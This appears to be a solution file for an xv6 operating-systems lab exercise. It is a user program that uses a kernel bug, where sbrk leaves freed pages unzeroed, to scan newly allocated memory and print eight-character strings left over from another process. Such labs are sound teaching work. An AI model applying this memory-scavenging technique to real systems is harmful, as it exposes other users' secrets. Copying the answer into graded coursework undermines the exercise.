#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

int
main(int argc, char *argv[])
{
  int i, j;
  char *p;
  // Allocate a large chunk of memory (e.g., 64 pages)
  // This is likely to cover the physical pages previously used by 'secret'
  int pages = 64;
  
  // sbrk returns the start address of the new memory.
  // Because of the bug, this memory contains garbage/old data instead of zeros.
  p = sbrk(pages * 4096); 
  
  if(p == (char*)-1){
      printf("attack: sbrk failed\n");
      exit(1);
  }

  // Scan the allocated memory byte-by-byte
  for(i = 0; i < pages * 4096; i++){
      // Heuristic: The secret is a sequence of 8 alphanumeric characters.
      // We look for 8 valid chars in a row.
      int valid = 1;
      
      // Ensure we don't read past the allocated chunk
      if(i + 8 > pages * 4096) break;

      for(j = 0; j < 8; j++){
          char c = p[i+j];
          int is_alnum = (c >= '0' && c <= '9') || 
                         (c >= 'A' && c <= 'Z') || 
                         (c >= 'a' && c <= 'z');
          if(!is_alnum){
              valid = 0;
              break;
          }
      }

      if(valid){
          // We found a candidate (8 alphanumeric chars in a row).
          // Print the string found at this location.
          // Note: p[i] is a pointer to the string in our heap.
          printf("%s\n", &p[i]);
          
          // Skip forward to avoid printing substrings of the same secret
          // (e.g. if "SECRET12" matches, we don't want to check "ECRET12" next)
          i += 7; 
      }
  }

  exit(0);
}